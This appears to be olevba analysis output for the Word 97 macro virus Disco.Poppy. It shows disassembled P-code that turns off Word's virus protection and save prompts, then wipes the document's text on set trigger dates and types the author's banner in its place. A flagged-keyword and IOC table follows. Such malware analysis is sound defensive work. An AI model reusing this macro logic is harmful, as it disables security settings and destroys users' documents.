' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #229:
' 	Ld D$ 
' 	LitStr 0x0007 "8/18/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #230:
' 	Ld D$ 
' 	LitStr 0x0006 "7/9/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #231:
' 	Ld D$ 
' 	LitStr 0x0008 "12/17/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #232:
' Line #233:
' Line #234:
' 	Ld Z 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #235:
' Line #236:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #237:
' 	LitVarSpecial (False)
' 	MemStWith CheckSpellingAsYouType 
' Line #238:
' 	LitVarSpecial (False)
' 	MemStWith CheckGrammarAsYouType 
' Line #239:
' 	LitVarSpecial (False)
' 	MemStWith SuggestSpellingCorrections 
' Line #240:
' 	LitVarSpecial (False)
' 	MemStWith SuggestFromMainDictionaryOnly 
' Line #241:
' 	LitVarSpecial (True)
' 	MemStWith CheckGrammarWithSpelling 
' Line #242:
' 	LitVarSpecial (False)
' 	MemStWith ShowReadabilityStatistics 
' Line #243:
' 	LitVarSpecial (True)
' 	MemStWith IgnoreUppercase 
' Line #244:
' 	LitVarSpecial (True)
' 	MemStWith IgnoreMixedDigits 
' Line #245:
' 	LitVarSpecial (True)
' 	MemStWith IgnoreInternetAndFileAddresses 
' Line #246:
' Line #247:
' 	EndWith 
' Line #248:
' Line #249:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #250:
' 	Ld wdCharacter 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall Delete 0x0002 
' Line #251:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #252:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #253:
' 	LineCont 0x0004 05 00 08 00
' 	LitStr 0x001D "Macro.Poppy.I aka Disco.Poppy"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #254:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #255:
' 	LineCont 0x0004 05 00 08 00
' 	LitStr 0x000C "By VicodinES"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #256:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #257:
' 	LineCont 0x0004 05 00 08 00
' 	LitStr 0x0017 "Macro Virus for Word 97"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #258:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #259:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #260:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #261:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #262:
' 	LineCont 0x0004 05 00 08 00
' 	LitStr 0x0029 "T h e   N a r k o t i c   N e t w o r k !"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #263:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #264:
' Line #265:
' 	ElseBlock 
' Line #266:
' Line #267:
' 	GoTo fuck1 
' Line #268:
' Line #269:
' 	EndIfBlock 
' Line #270:
' Line #271:
' 	Label fuck1 
' Line #272:
' Line #273:
' Line #274:
' 	EndSub 
' Line #275:
' 	FuncDefn (Sub HelpAbout())
' Line #276:
' Line #277:
' Line #278:
' 	LitStr 0x0024 "  W97M/Disco.Poppy.II by VicodinES  "
' 	Ld vbOKOnly 
' 	LitStr 0x0018 " © The Narkotic Network "
' 	ArgsCall MsgBox 0x0003 
' Line #279:
' 	LitStr 0x0044 "Everything is fine - nothing to see here - let's move it along kids!"
' 	Ld vbExclamation 
' 	LitStr 0x002E " * VicodinES * Klonopin.Jones * Fastin.Blee * "
' 	ArgsCall MsgBox 0x0003 
' Line #280:
' 	LitStr 0x0026 "Social camouflage for this modern age!"
' 	Ld vbQuestion 
' 	LitStr 0x0007 "Slogan?"
' 	ArgsCall MsgBox 0x0003 
' Line #281:
' 	EndSub 
' Line #282:
' 	FuncDefn (Public Sub ToolsMacro())
' Line #283:
' Line #284:
' Line #285:
' 	Dim 
' 	VarDefn D
' Line #286:
' 	Dim 
' 	VarDefn Ti
' Line #287:
' 	Dim 
' 	VarDefn Tp
' Line #288:
' 	Dim 
' 	VarDefn Z
' Line #289:
' Line #290:
' Line #291:
' 	Ld Time 
' 	St Ti$ 
' Line #292:
' 	LitStr 0x000B "12:00:01 PM"
' 	St Tp$ 
' Line #293:
' 	Ld Date 
' 	St D$ 
' Line #294:
' Line #295:
' Line #296:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #297:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #298:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #299:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #300:
' 	EndWith 
' Line #301:
' Line #302:
' 	LitDI2 0x0000 
' 	St Z 
' Line #303:
' Line #304:
' 	Ld D$ 
' 	LitStr 0x0007 "4/12/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #305:
' 	Ld Ti$ 
' 	Ld Tp$ 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #306:
' 	Ld D$ 
' 	LitStr 0x0007 "4/12/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #307:
' 	Ld D$ 
' 	LitStr 0x0007 "1/11/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #308:
' 	Ld D$ 
' 	LitStr 0x0007 "1/11/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #309:
' 	Ld D$ 
' 	LitStr 0x0007 "6/14/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #310:
' 	Ld D$ 
' 	LitStr 0x0007 "1/22/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #311:
' 	Ld D$ 
' 	LitStr 0x0007 "8/21/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #312:
' 	Ld D$ 
' 	LitStr 0x0007 "9/19/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #313:
' 	Ld D$ 
' 	LitStr 0x0007 "8/18/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #314:
' 	Ld D$ 
' 	LitStr 0x0006 "7/9/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #315:
' 	Ld D$ 
' 	LitStr 0x0008 "12/17/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #316:
' 	Ld D$ 
' 	LitStr 0x0007 "8/18/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #317:
' 	Ld D$ 
' 	LitStr 0x0006 "7/9/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #318:
' 	Ld D$ 
' 	LitStr 0x0008 "12/17/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #319:
' Line #320:
' 	Ld Z 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #321:
' Line #322:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #323:
' 	LitVarSpecial (False)
' 	MemStWith CheckSpellingAsYouType 
' Line #324:
' 	LitVarSpecial (False)
' 	MemStWith CheckGrammarAsYouType 
' Line #325:
' 	LitVarSpecial (False)
' 	MemStWith SuggestSpellingCorrections 
' Line #326:
' 	LitVarSpecial (False)
' 	MemStWith SuggestFromMainDictionaryOnly 
' Line #327:
' 	LitVarSpecial (True)
' 	MemStWith CheckGrammarWithSpelling 
' Line #328:
' 	LitVarSpecial (False)
' 	MemStWith ShowReadabilityStatistics 
' Line #329:
' 	LitVarSpecial (True)
' 	MemStWith IgnoreUppercase 
' Line #330:
' 	LitVarSpecial (True)
' 	MemStWith IgnoreMixedDigits 
' Line #331:
' 	LitVarSpecial (True)
' 	MemStWith IgnoreInternetAndFileAddresses 
' Line #332:
' Line #333:
' 	EndWith 
' Line #334:
' Line #335:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #336:
' 	Ld wdCharacter 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall Delete 0x0002 
' Line #337:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #338:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #339:
' 	LineCont 0x0004 05 00 08 00
' 	LitStr 0x001D "Macro.Poppy.I aka Disco.Poppy"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #340:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #341:
' 	LineCont 0x0004 05 00 08 00
' 	LitStr 0x000C "By VicodinES"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #342:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #343:
' 	LineCont 0x0004 05 00 08 00
' 	LitStr 0x0017 "Macro Virus for Word 97"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #344:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #345:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #346:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #347:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #348:
' 	LineCont 0x0004 05 00 08 00
' 	LitStr 0x0029 "T h e   N a r k o t i c   N e t w o r k !"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #349:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #350:
' Line #351:
' 	ElseBlock 
' Line #352:
' Line #353:
' 	GoTo fuck1 
' Line #354:
' Line #355:
' 	EndIfBlock 
' Line #356:
' Line #357:
' 	Label fuck1 
' Line #358:
' Line #359:
' 	EndSub 
' Line #360:
' Line #361:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|shell32             |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |msfile.bat          |Executable file name                         |
|IOC       |autorun.inf         |Executable file name                         |
|IOC       |pifmgr.dll          |Executable file name                         |
|IOC       |shell32.dll         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

